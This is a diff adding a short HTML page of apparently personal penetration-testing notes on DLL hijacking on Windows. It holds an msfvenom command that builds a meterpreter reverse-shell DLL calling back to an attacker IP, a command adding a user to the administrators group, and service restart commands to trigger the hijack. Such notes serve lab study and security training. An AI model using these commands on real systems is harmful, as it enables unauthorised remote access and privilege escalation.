@@ -1,0 +1,8 @@
+<!doctype html><html>
+    <head>
+      <meta http-equiv="content-type" content="text/html; charset=utf-8">
+      <title>DLL Hijacking</title>
+      <meta name="generator" content="CherryTree">
+      <link rel="stylesheet" href="res/styles3.css" type="text/css" />
+    </head>
+    <body><div class='page'><h1 class='title'>DLL Hijacking</h1><br/>DLL Hijacking<br />	Can be found via procmon. More than likely, this will be found with a tool if at all.<br />	A DLL Hijack occurs when an executable tries to load a dll that is not there.<br />	You will need to be able to write to that location and probably start the service.<br />	msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.9.0.59 -f dll -a x64 -o hijackme.dll  (arch is super important for dll&#39;s)<br />		or		windows_dll.c is kept in the compiled binaries github<br />				Edit the line to change the commands you are going to run (probably add a user to the administrators group or run NC for a rev shell).<br />				example: cmd.exe /k net localgroup administrators squid /add<br />				compile it with line from top of code (x86 or x64 is super important)          (apt install gcc-mingw-w64)<br />				put x.exe on the target<br />	sc stop dllsvc<br />	sc start dllsvc</div></body></html>
